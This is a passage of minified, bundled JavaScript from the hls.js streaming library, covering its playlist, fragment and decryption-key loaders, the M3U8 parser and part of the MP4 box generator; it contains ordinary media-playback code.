n=t.frag;n.loaded=e.loaded,this.hls.trigger(a.default.FRAG_LOAD_PROGRESS,{frag:n,stats:e,networkDetails:i})},r}(s.default);t.default=l}).call(this,r("./src/polyfills/number.js").Number)},"./src/loader/fragment.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./node_modules/url-toolkit/src/url-toolkit.js"),n=r("./src/loader/level-key.js"),a=function(){function t(){var e;this._url=null,this._byteRange=null,this._decryptdata=null,this.tagList=[],this.programDateTime=null,this.rawProgramDateTime=null,this._elementaryStreams=((e={})[t.ElementaryStreamTypes.AUDIO]=!1,e[t.ElementaryStreamTypes.VIDEO]=!1,e)}return Object.defineProperty(t,"ElementaryStreamTypes",{get:function(){return{AUDIO:"audio",VIDEO:"video"}},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"url",{get:function(){return!this._url&&this.relurl&&(this._url=i.buildAbsoluteURL(this.baseurl,this.relurl,{alwaysNormalize:!0})),this._url},set:function(e){this._url=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"byteRange",{get:function(){if(!this._byteRange&&!this.rawByteRange)return[];if(this._byteRange)return this._byteRange;var e=[];if(this.rawByteRange){var t=this.rawByteRange.split("@",2);if(1===t.length){var r=this.lastByteRangeEndOffset;e[0]=r||0}else e[0]=parseInt(t[1]);e[1]=parseInt(t[0])+e[0],this._byteRange=e}return e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"byteRangeStartOffset",{get:function(){return this.byteRange[0]},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"byteRangeEndOffset",{get:function(){return this.byteRange[1]},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"decryptdata",{get:function(){return this._decryptdata||(this._decryptdata=this.fragmentDecryptdataFromLevelkey(this.levelkey,this.sn)),this._decryptdata},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"endProgramDateTime",{get:function(){if(!e.isFinite(this.programDateTime))return null;var t=e.isFinite(this.duration)?this.duration:0;return this.programDateTime+1e3*t},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"encrypted",{get:function(){return!(!this.decryptdata||null===this.decryptdata.uri||null!==this.decryptdata.key)},enumerable:!0,configurable:!0}),t.prototype.addElementaryStream=function(e){this._elementaryStreams[e]=!0},t.prototype.hasElementaryStream=function(e){return!0===this._elementaryStreams[e]},t.prototype.createInitializationVector=function(e){for(var t=new Uint8Array(16),r=12;r<16;r++)t[r]=e>>8*(15-r)&255;return t},t.prototype.fragmentDecryptdataFromLevelkey=function(e,t){var r=e;return e&&e.method&&e.uri&&!e.iv&&((r=new n.default).method=e.method,r.baseuri=e.baseuri,r.reluri=e.reluri,r.iv=this.createInitializationVector(t)),r},t}();t.default=a}).call(this,r("./src/polyfills/number.js").Number)},"./src/loader/key-loader.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/errors.js"),u=r("./src/utils/logger.js"),l=function(e){function t(t){var r=e.call(this,t,a.default.KEY_LOADING)||this;return r.loaders={},r.decryptkey=null,r.decrypturl=null,r}return n(t,e),t.prototype.destroy=function(){for(var e in this.loaders){var t=this.loaders[e];t&&t.destroy()}this.loaders={},s.default.prototype.destroy.call(this)},t.prototype.onKeyLoading=function(e){var t=e.frag,r=t.type,i=this.loaders[r],n=t.decryptdata,s=n.uri;if(s!==this.decrypturl||null===this.decryptkey){var o=this.hls.config;i&&(u.logger.warn("abort previous key loader for type:"+r),i.abort()),t.loader=this.loaders[r]=new o.loader(o),this.decrypturl=s,this.decryptkey=null;var l,c,d;l={url:s,frag:t,responseType:"arraybuffer"},c={timeout:o.fragLoadingTimeOut,maxRetry:0,retryDelay:o.fragLoadingRetryDelay,maxRetryDelay:o.fragLoadingMaxRetryTimeout},d={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this)},t.loader.load(l,c,d)}else this.decryptkey&&(n.key=this.decryptkey,this.hls.trigger(a.default.KEY_LOADED,{frag:t}))},t.prototype.loadsuccess=function(e,t,r){var i=r.frag;this.decryptkey=i.decryptdata.key=new Uint8Array(e.data),i.loader=void 0,this.loaders[i.type]=void 0,this.hls.trigger(a.default.KEY_LOADED,{frag:i})},t.prototype.loaderror=function(e,t){var r=t.frag,i=r.loader;i&&i.abort(),this.loaders[t.type]=void 0,this.hls.trigger(a.default.ERROR,{type:o.ErrorTypes.NETWORK_ERROR,details:o.ErrorDetails.KEY_LOAD_ERROR,fatal:!1,frag:r,response:e})},t.prototype.loadtimeout=function(e,t){var r=t.frag,i=r.loader;i&&i.abort(),this.loaders[t.type]=void 0,this.hls.trigger(a.default.ERROR,{type:o.ErrorTypes.NETWORK_ERROR,details:o.ErrorDetails.KEY_LOAD_TIMEOUT,fatal:!1,frag:r})},t}(s.default);t.default=l},"./src/loader/level-key.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./node_modules/url-toolkit/src/url-toolkit.js"),n=function(){function e(){this.method=null,this.key=null,this.iv=null,this._uri=null}return Object.defineProperty(e.prototype,"uri",{get:function(){return!this._uri&&this.reluri&&(this._uri=i.buildAbsoluteURL(this.baseuri,this.reluri,{alwaysNormalize:!0})),this._uri},enumerable:!0,configurable:!0}),e}();t.default=n},"./src/loader/level.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var r=function(){function t(e){this.endCC=0,this.endSN=0,this.fragments=[],this.initSegment=null,this.live=!0,this.needSidxRanges=!1,this.startCC=0,this.startSN=0,this.startTimeOffset=null,this.targetduration=0,this.totalduration=0,this.type=null,this.url=e,this.version=null}return Object.defineProperty(t.prototype,"hasProgramDateTime",{get:function(){return!(!this.fragments[0]||!e.isFinite(this.fragments[0].programDateTime))},enumerable:!0,configurable:!0}),t}();t.default=r}).call(this,r("./src/polyfills/number.js").Number)},"./src/loader/m3u8-parser.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./node_modules/url-toolkit/src/url-toolkit.js"),n=r("./src/loader/fragment.js"),a=r("./src/loader/level.js"),s=r("./src/loader/level-key.js"),o=r("./src/utils/attr-list.js"),u=r("./src/utils/logger.js"),l=r("./src/utils/codecs.js"),c=/#EXT-X-STREAM-INF:([^\n\r]*)[\r\n]+([^\r\n]+)/g,d=/#EXT-X-MEDIA:(.*)/g,f=new RegExp([/#EXTINF:\s*(\d*(?:\.\d+)?)(?:,(.*)\s+)?/.source,/|(?!#)([\S+ ?]+)/.source,/|#EXT-X-BYTERANGE:*(.+)/.source,/|#EXT-X-PROGRAM-DATE-TIME:(.+)/.source,/|#.*/.source].join(""),"g"),h=/(?:(?:#(EXTM3U))|(?:#EXT-X-(PLAYLIST-TYPE):(.+))|(?:#EXT-X-(MEDIA-SEQUENCE): *(\d+))|(?:#EXT-X-(TARGETDURATION): *(\d+))|(?:#EXT-X-(KEY):(.+))|(?:#EXT-X-(START):(.+))|(?:#EXT-X-(ENDLIST))|(?:#EXT-X-(DISCONTINUITY-SEQ)UENCE:(\d+))|(?:#EXT-X-(DIS)CONTINUITY))|(?:#EXT-X-(VERSION):(\d+))|(?:#EXT-X-(MAP):(.+))|(?:(#)([^:]*):(.*))|(?:(#)(.*))(?:.*)\r?\n?/,p=/\.(mp4|m4s|m4v|m4a)$/i,g=function(){function t(){}return t.findGroup=function(e,t){if(!e)return null;for(var r=null,i=0;i<e.length;i++){var n=e[i];n.id===t&&(r=n)}return r},t.convertAVC1ToAVCOTI=function(e){var t,r=e.split(".");return r.length>2?(t=r.shift()+".",t+=parseInt(r.shift()).toString(16),t+=("000"+parseInt(r.shift()).toString(16)).substr(-4)):t=e,t},t.resolve=function(e,t){return i.buildAbsoluteURL(t,e,{alwaysNormalize:!0})},t.parseMasterPlaylist=function(e,r){var i,n=[];function a(e,t){["video","audio"].forEach(function(r){var i=e.filter(function(e){return l.isCodecType(e,r)});if(i.length){var n=i.filter(function(e){return 0===e.lastIndexOf("avc1",0)||0===e.lastIndexOf("mp4a",0)});t[r+"Codec"]=n.length>0?n[0]:i[0],e=e.filter(function(e){return-1===i.indexOf(e)})}}),t.unknownCodecs=e}for(c.lastIndex=0;null!=(i=c.exec(e));){var s={},u=s.attrs=new o.default(i[1]);s.url=t.resolve(i[2],r);var d=u.decimalResolution("RESOLUTION");d&&(s.width=d.width,s.height=d.height),s.bitrate=u.decimalInteger("AVERAGE-BANDWIDTH")||u.decimalInteger("BANDWIDTH"),s.name=u.NAME,a([].concat((u.CODECS||"").split(/[ ,]+/)),s),s.videoCodec&&-1!==s.videoCodec.indexOf("avc1")&&(s.videoCodec=t.convertAVC1ToAVCOTI(s.videoCodec)),n.push(s)}return n},t.parseMasterPlaylistMedia=function(e,r,i,n){var a;void 0===n&&(n=[]);var s=[],u=0;for(d.lastIndex=0;null!==(a=d.exec(e));){var l={},c=new o.default(a[1]);if(c.TYPE===i){if(l.groupId=c["GROUP-ID"],l.name=c.NAME,l.type=i,l.default="YES"===c.DEFAULT,l.autoselect="YES"===c.AUTOSELECT,l.forced="YES"===c.FORCED,c.URI&&(l.url=t.resolve(c.URI,r)),l.lang=c.LANGUAGE,l.name||(l.name=l.lang),n.length){var f=t.findGroup(n,l.groupId);l.audioCodec=f?f.codec:n[0].codec}l.id=u++,s.push(l)}}return s},t.parseLevelPlaylist=function(t,r,i,l,c){var d,g,v=0,m=0,L=new a.default(r),M=new s.default,T=0,A=null,w=new n.default,E=null;for(f.lastIndex=0;null!==(d=f.exec(t));){var S=d[1];if(S){w.duration=parseFloat(S);var D=(" "+d[2]).slice(1);w.title=D||null,w.tagList.push(D?["INF",S,D]:["INF",S])}else if(d[3]){if(e.isFinite(w.duration)){var b=v++;w.type=l,w.start=m,w.levelkey=M,w.sn=b,w.level=i,w.cc=T,w.urlId=c,w.baseurl=r,w.relurl=(" "+d[3]).slice(1),y(w,A),L.fragments.push(w),A=w,m+=w.duration,w=new n.default}}else if(d[4]){if(w.rawByteRange=(" "+d[4]).slice(1),A){var j=A.byteRangeEndOffset;j&&(w.lastByteRangeEndOffset=j)}}else if(d[5])w.rawProgramDateTime=(" "+d[5]).slice(1),w.tagList.push(["PROGRAM-DATE-TIME",w.rawProgramDateTime]),null===E&&(E=L.fragments.length);else{for(d=d[0].match(h),g=1;g<d.length&&void 0===d[g];g++);var C=(" "+d[g+1]).slice(1),I=(" "+d[g+2]).slice(1);switch(d[g]){case"#":w.tagList.push(I?[C,I]:[C]);break;case"PLAYLIST-TYPE":L.type=C.toUpperCase();break;case"MEDIA-SEQUENCE":v=L.startSN=parseInt(C);break;case"TARGETDURATION":L.targetduration=parseFloat(C);break;case"VERSION":L.version=parseInt(C);break;case"EXTM3U":break;case"ENDLIST":L.live=!1;break;case"DIS":T++,w.tagList.push(["DIS"]);break;case"DISCONTINUITY-SEQ":T=parseInt(C);break;case"KEY":var x=C,N=new o.default(x),_=N.enumeratedString("METHOD"),O=N.URI,k=N.hexadecimalInteger("IV");_&&(M=new s.default,O&&["AES-128","SAMPLE-AES","SAMPLE-AES-CENC"].indexOf(_)>=0&&(M.method=_,M.baseuri=r,M.reluri=O,M.key=null,M.iv=k));break;case"START":var R=C,P=new o.default(R).decimalFloatingPoint("TIME-OFFSET");e.isFinite(P)&&(L.startTimeOffset=P);break;case"MAP":var F=new o.default(C);w.relurl=F.URI,w.rawByteRange=F.BYTERANGE,w.baseurl=r,w.level=i,w.type=l,w.sn="initSegment",L.initSegment=w,(w=new n.default).rawProgramDateTime=L.initSegment.rawProgramDateTime;break;default:u.logger.warn("line parsed but not handled: "+d)}}}return(w=A)&&!w.relurl&&(L.fragments.pop(),m-=w.duration),L.totalduration=m,L.averagetargetduration=m/L.fragments.length,L.endSN=v-1,L.startCC=L.fragments[0]?L.fragments[0].cc:0,L.endCC=T,!L.initSegment&&L.fragments.length&&L.fragments.every(function(e){return p.test(e.relurl)})&&(u.logger.warn("MP4 fragments found but no init segment (probably no MAP, incomplete M3U8), trying to fetch SIDX"),(w=new n.default).relurl=L.fragments[0].relurl,w.baseurl=r,w.level=i,w.type=l,w.sn="initSegment",L.initSegment=w,L.needSidxRanges=!0),E&&function(e,t){for(var r=e[t],i=t-1;i>=0;i--){var n=e[i];n.programDateTime=r.programDateTime-1e3*n.duration,r=n}}(L.fragments,E),L},t}();function y(t,r){t.rawProgramDateTime?t.programDateTime=Date.parse(t.rawProgramDateTime):r&&r.programDateTime&&(t.programDateTime=r.endProgramDateTime),e.isFinite(t.programDateTime)||(t.programDateTime=null,t.rawProgramDateTime=null)}t.default=g}).call(this,r("./src/polyfills/number.js").Number)},"./src/loader/playlist-loader.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/errors.js"),u=r("./src/utils/logger.js"),l=r("./src/demux/mp4demuxer.js"),c=r("./src/loader/m3u8-parser.js"),d=window.performance,f={MANIFEST:"manifest",LEVEL:"level",AUDIO_TRACK:"audioTrack",SUBTITLE_TRACK:"subtitleTrack"},h={MAIN:"main",AUDIO:"audio",SUBTITLE:"subtitle"},p=function(t){function r(e){var r=t.call(this,e,a.default.MANIFEST_LOADING,a.default.LEVEL_LOADING,a.default.AUDIO_TRACK_LOADING,a.default.SUBTITLE_TRACK_LOADING)||this;return r.loaders={},r}return n(r,t),Object.defineProperty(r,"ContextType",{get:function(){return f},enumerable:!0,configurable:!0}),Object.defineProperty(r,"LevelType",{get:function(){return h},enumerable:!0,configurable:!0}),r.canHaveQualityLevels=function(e){return e!==f.AUDIO_TRACK&&e!==f.SUBTITLE_TRACK},r.mapContextToLevelType=function(e){switch(e.type){case f.AUDIO_TRACK:return h.AUDIO;case f.SUBTITLE_TRACK:return h.SUBTITLE;default:return h.MAIN}},r.getResponseUrl=function(e,t){var r=e.url;return void 0!==r&&0!==r.indexOf("data:")||(r=t.url),r},r.prototype.createInternalLoader=function(e){var t=this.hls.config,r=t.pLoader,i=t.loader,n=new(r||i)(t);return e.loader=n,this.loaders[e.type]=n,n},r.prototype.getInternalLoader=function(e){return this.loaders[e.type]},r.prototype.resetInternalLoader=function(e){this.loaders[e]&&delete this.loaders[e]},r.prototype.destroyInternalLoaders=function(){for(var e in this.loaders){var t=this.loaders[e];t&&t.destroy(),this.resetInternalLoader(e)}},r.prototype.destroy=function(){this.destroyInternalLoaders(),t.prototype.destroy.call(this)},r.prototype.onManifestLoading=function(e){this.load(e.url,{type:f.MANIFEST,level:0,id:null})},r.prototype.onLevelLoading=function(e){this.load(e.url,{type:f.LEVEL,level:e.level,id:e.id})},r.prototype.onAudioTrackLoading=function(e){this.load(e.url,{type:f.AUDIO_TRACK,level:null,id:e.id})},r.prototype.onSubtitleTrackLoading=function(e){this.load(e.url,{type:f.SUBTITLE_TRACK,level:null,id:e.id})},r.prototype.load=function(e,t){var r=this.hls.config;u.logger.debug("Loading playlist of type "+t.type+", level: "+t.level+", id: "+t.id);var i,n,a,s,o=this.getInternalLoader(t);if(o){var l=o.context;if(l&&l.url===e)return u.logger.trace("playlist request ongoing"),!1;u.logger.warn("aborting previous loader for type: "+t.type),o.abort()}switch(t.type){case f.MANIFEST:i=r.manifestLoadingMaxRetry,n=r.manifestLoadingTimeOut,a=r.manifestLoadingRetryDelay,s=r.manifestLoadingMaxRetryTimeout;break;case f.LEVEL:i=0,n=r.levelLoadingTimeOut;break;default:i=r.levelLoadingMaxRetry,n=r.levelLoadingTimeOut,a=r.levelLoadingRetryDelay,s=r.levelLoadingMaxRetryTimeout}o=this.createInternalLoader(t),t.url=e,t.responseType=t.responseType||"";var c={timeout:n,maxRetry:i,retryDelay:a,maxRetryDelay:s},d={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this)};return u.logger.debug("Calling internal loader delegate for URL: "+e),o.load(t,c,d),!0},r.prototype.loadsuccess=function(e,t,r,i){if(void 0===i&&(i=null),r.isSidxRequest)return this._handleSidxRequest(e,r),void this._handlePlaylistLoaded(e,t,r,i);this.resetInternalLoader(r.type);var n=e.data;t.tload=d.now(),0===n.indexOf("#EXTM3U")?n.indexOf("#EXTINF:")>0||n.indexOf("#EXT-X-TARGETDURATION:")>0?this._handleTrackOrLevelPlaylist(e,t,r,i):this._handleMasterPlaylist(e,t,r,i):this._handleManifestParsingError(e,r,"no EXTM3U delimiter",i)},r.prototype.loaderror=function(e,t,r){void 0===r&&(r=null),this._handleNetworkError(t,r,!1,e)},r.prototype.loadtimeout=function(e,t,r){void 0===r&&(r=null),this._handleNetworkError(t,r,!0)},r.prototype._handleMasterPlaylist=function(e,t,i,n){var s=this.hls,o=e.data,l=r.getResponseUrl(e,i),d=c.default.parseMasterPlaylist(o,l);if(d.length){var f=d.map(function(e){return{id:e.attrs.AUDIO,codec:e.audioCodec}}),h=c.default.parseMasterPlaylistMedia(o,l,"AUDIO",f),p=c.default.parseMasterPlaylistMedia(o,l,"SUBTITLES");if(h.length){var g=!1;h.forEach(function(e){e.url||(g=!0)}),!1===g&&d[0].audioCodec&&!d[0].attrs.AUDIO&&(u.logger.log("audio codec signaled in quality level, but no embedded audio track signaled, create one"),h.unshift({type:"main",name:"main"}))}s.trigger(a.default.MANIFEST_LOADED,{levels:d,audioTracks:h,subtitles:p,url:l,stats:t,networkDetails:n})}else this._handleManifestParsingError(e,i,"no level found in manifest",n)},r.prototype._handleTrackOrLevelPlaylist=function(t,i,n,s){var o=this.hls,u=n.id,l=n.level,h=n.type,p=r.getResponseUrl(t,n),g=e.isFinite(u)?u:0,y=e.isFinite(l)?l:g,v=r.mapContextToLevelType(n),m=c.default.parseLevelPlaylist(t.data,p,y,v,g);if(m.tload=i.tload,h===f.MANIFEST){var L={url:p,details:m};o.trigger(a.default.MANIFEST_LOADED,{levels:[L],audioTracks:[],url:p,stats:i,networkDetails:s})}if(i.tparsed=d.now(),m.needSidxRanges){var M=m.initSegment.url;this.load(M,{isSidxRequest:!0,type:h,level:l,levelDetails:m,id:u,rangeStart:0,rangeEnd:2048,responseType:"arraybuffer"})}else n.levelDetails=m,this._handlePlaylistLoaded(t,i,n,s)},r.prototype._handleSidxRequest=function(e,t){var r=l.default.parseSegmentIndex(new Uint8Array(e.data));if(r){var i=r.references,n=t.levelDetails;i.forEach(function(e,t){var r=e.info,i=n.fragments[t];0===i.byteRange.length&&(i.rawByteRange=String(1+r.end-r.start)+"@"+String(r.start))}),n.initSegment.rawByteRange=String(r.moovEndOffset)+"@0"}},r.prototype._handleManifestParsingError=function(e,t,r,i){this.hls.trigger(a.default.ERROR,{type:o.ErrorTypes.NETWORK_ERROR,details:o.ErrorDetails.MANIFEST_PARSING_ERROR,fatal:!0,url:e.url,reason:r,networkDetails:i})},r.prototype._handleNetworkError=function(e,t,r,i){var n,s;void 0===r&&(r=!1),void 0===i&&(i=null),u.logger.info("A network error occured while loading a "+e.type+"-type playlist");var l=this.getInternalLoader(e);switch(e.type){case f.MANIFEST:n=r?o.ErrorDetails.MANIFEST_LOAD_TIMEOUT:o.ErrorDetails.MANIFEST_LOAD_ERROR,s=!0;break;case f.LEVEL:n=r?o.ErrorDetails.LEVEL_LOAD_TIMEOUT:o.ErrorDetails.LEVEL_LOAD_ERROR,s=!1;break;case f.AUDIO_TRACK:n=r?o.ErrorDetails.AUDIO_TRACK_LOAD_TIMEOUT:o.ErrorDetails.AUDIO_TRACK_LOAD_ERROR,s=!1;break;default:s=!1}l&&(l.abort(),this.resetInternalLoader(e.type));var c={type:o.ErrorTypes.NETWORK_ERROR,details:n,fatal:s,url:l.url,loader:l,context:e,networkDetails:t};i&&(c.response=i),this.hls.trigger(a.default.ERROR,c)},r.prototype._handlePlaylistLoaded=function(e,t,i,n){var s=i.type,o=i.level,u=i.id,l=i.levelDetails;if(l.targetduration)if(r.canHaveQualityLevels(i.type))this.hls.trigger(a.default.LEVEL_LOADED,{details:l,level:o||0,id:u||0,stats:t,networkDetails:n});else switch(s){case f.AUDIO_TRACK:this.hls.trigger(a.default.AUDIO_TRACK_LOADED,{details:l,id:u,stats:t,networkDetails:n});break;case f.SUBTITLE_TRACK:this.hls.trigger(a.default.SUBTITLE_TRACK_LOADED,{details:l,id:u,stats:t,networkDetails:n})}else this._handleManifestParsingError(e,i,"invalid target duration",n)},r}(s.default);t.default=p}).call(this,r("./src/polyfills/number.js").Number)},"./src/observer.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return n(t,e),t.prototype.trigger=function(e){for(var t=[],r=1;r<arguments.length;r++)t[r-1]=arguments[r];this.emit.apply(this,[e,e].concat(t))},t}(r("./node_modules/eventemitter3/index.js").EventEmitter);t.Observer=a},"./src/polyfills/number.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/get-self-scope.js").getSelfScope().Number;t.Number=i,i.isFinite=i.isFinite||function(e){return"number"==typeof e&&isFinite(e)}},"./src/remux/aac-helper.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(){}return e.getSilentFrame=function(e,t){switch(e){case"mp4a.40.2":if(1===t)return new Uint8Array([0,200,0,128,35,128]);if(2===t)return new Uint8Array([33,0,73,144,2,25,0,35,128]);if(3===t)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,142]);if(4===t)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,128,44,128,8,2,56]);if(5===t)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,56]);if(6===t)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,0,178,0,32,8,224]);break;default:if(1===t)return new Uint8Array([1,64,34,128,163,78,230,128,186,8,0,0,0,28,6,241,193,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(2===t)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(3===t)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94])}return null},e}();t.default=i},"./src/remux/mp4-generator.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=Math.pow(2,32)-1,n=function(){function e(){}return e.init=function(){var t;for(t in e.types={avc1:[],avcC:[],btrt:[],dinf:[],dref:[],esds:[],ftyp:[],hdlr:[],mdat:[],mdhd:[],mdia:[],mfhd:[],minf:[],moof:[],moov:[],mp4a:[],".mp3":[],mvex:[],mvhd:[],pasp:[],sdtp:[],stbl:[],stco:[],stsc:[],stsd:[],stsz:[],stts:[],tfdt:[],tfhd:[],traf:[],trak:[],trun:[],trex:[],tkhd:[],vmhd:[],smhd:[]},e.types)e.types.hasOwnProperty(t)&&(e.types[t]=[t.charCodeAt(0),t.charCodeAt(1),t.charCodeAt(2),t.charCodeAt(3)]);var r=new Uint8Array([0,0,0,0,0,0,0,0,118,105,100,101,0,0,0,0,0,0,0,0,0,0,0,0,86,105,100,101,111,72,97,110,100,108,101,114,0]),i=new Uint8Array([0,0,0,0,0,0,0,0,115,111,117,110,0,0,0,0,0,0,0,0,0,0,0,0,83,111,117,110,100,72,97,110,100,108,101,114,0]);e.HDLR_TYPES={video:r,audio:i};var n=new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,12,117,114,108,32,0,0,0,1]),a=new Uint8Array([0,0,0,0,0,0,0,0]);e.STTS=e.STSC=e.STCO=a,e.STSZ=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0]),e.VMHD=new Uint8Array([0,0,0,1,0,0,0,0,0,0,0,0]),e.SMHD=new Uint8Array([0,0,0,0,0,0,0,0]),e.STSD=new Uint8Array([0,0,0,0,0,0,0,1]);var s=new Uint8Array([105,115,111,109]),o=new Uint8Array([97,118,99,49]),u=new Uint8Array([0,0,0,1]);e.FTYP=e.box(e.types.ftyp,s,u,s,o),e.DINF=e.box(e.types.dinf,e.box(e.types.dref,n))},e.box=function(e){for(var t,r=Array.prototype.slice.call(arguments,1),i=8,n=r.length,a=n;n--;)i+=r[n].byteLength;for((t=new Uint8Array(i))[0]=i>>24&255,t[1]=i>>16&255,t[2]=i>>8&255,t[3]=255&i,t.set(e,4),n=0,i=8;n<a;n++)t.set(r[n],i),i+=r[n].byteLength;return t},e.hdlr=function(t){return e.box(e.types.hdlr,e.HDLR_TYPES[t])},e.mdat=function(t){return e.box(e.types.mdat,t)},e.mdhd=function(t,r){r*=t;var n=Math.floor(r/(i+1)),a=Math.floor(r%(i+1));return e.box(e.types.mdhd,new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,t>>24&255,t>>16&255,t>>8&255,255&t,n>>24,n>>16&255,n>>8&255,255&n,a>>24,a>>16&255,a>>8&255,255&a,85,196,0,0]))},e.mdia=function(t){return e.box(e.types.mdia,e.mdhd(t.timescale,t.duration),e.hdlr(t.type),e.minf(t))},e.mfhd=function(t){return e.box(e.types.mfhd,new Uint8Array([0,0,0,0,t>>24,t>>16&255,t>>8&255,255&t]))},e.minf=function(t){return"audio"===t.type?e.box(e.types.minf,e.box(e.types.smhd,e.SMHD),e.DINF,e.stbl(t)):e.box(e.types.minf,e.box(e.types.vmhd,e.VMHD),e.DINF,e.stbl(t))},e.moof=function(t,r,i){return e.box(e.types.moof,e.mfhd(t),e.traf(i,r))},e.moov=function(t){for(var r=t.length,i=[];r--;)i[r]=e.trak(t[r]);return e.box.apply(null,[e.types.moov,e.mvhd(t[0].timescale,t[0].duration)].concat(i).concat(e.mvex(t)))},e.mvex=function(t){for(var r=t.length,i=[];r--;)i[r]=e.trex(t[r]);return e.box.apply(null,[e.types.mvex].concat(i))},e.mvhd=function(t,r){r*=t;var n=Math.floor(r/(i+1)),a=Math.floor(r%(i+1)),s=new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,t>>24&255,t>>16&255,t>>8&255,255&t,n>>24,n>>16&255,n>>8&255,255&n,a>>24,a>>16&255,a>>8&255,255&a,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255]);return e.box(e.types.mvhd,s)},e.sdtp=function(t){var r,i,n=t.samples||[],a=new Uint8Array(4+n.length);for(i=0;i<n.length;i++)r=n[i].flags,a[i+4]=r.dependsOn<<4|r.isDependedOn<<2|r.hasRedundancy;return e.box(e.types.sdtp,a)},e.stbl=function(t){return e.box(e.types.stbl,e.stsd(t),e.box(e.types.stts,e.STTS),e.box(e.types.stsc,e.STSC),e.box(e.types.stsz,e.STSZ),e.box(e.types.stco,e.STCO))},e.avc1=function(t){var r,i,n,a=[],s=[];for(r=0;r<t.sps.length;r++)n=(i=t.sps[r]).byteLength,a.push(n>>>8&255),a.push(255&n),a=a.concat(Array.prototype.slice.call(i));for(r=0;r<t.pps.length;r++)n=(i=t.pps[r]).byteLength,s.push(n>>>8&255),s.push(255&n),s=s.concat(Array.prototype.slice.call(i));var o=e.box(e.types.avcC,new Uint8Array([1,a[3],a[4],a[5],255,224|t.sps.length].concat(a).concat([t.pps.length]).concat(s))),u=t.width,l=t.height,c=t.pixelRatio[0],d=t.pixelRatio[1];return e.box(e.types.avc1,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,u>>8&255,255&u,l>>8&255,255&l,0,72,0,0,0,72,0,0,0,0,0,0,0,1,18,100,97,105,108,121,109,111,116,105,111,110,47,104,108,115,46,106,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,17,17]),o,e.box(e.types.btrt,new Uint8Array([0,28,156,128,0,45,198,192,0,45,198,192])),e.box(e.types.pasp,new Uint8Array([c>>24,c>>16&255,c>>8&255,255&c,d>>24,d>>16&255,d>>8&255,255&d])))},e.esds=function(e){var t=e.config.length;return new 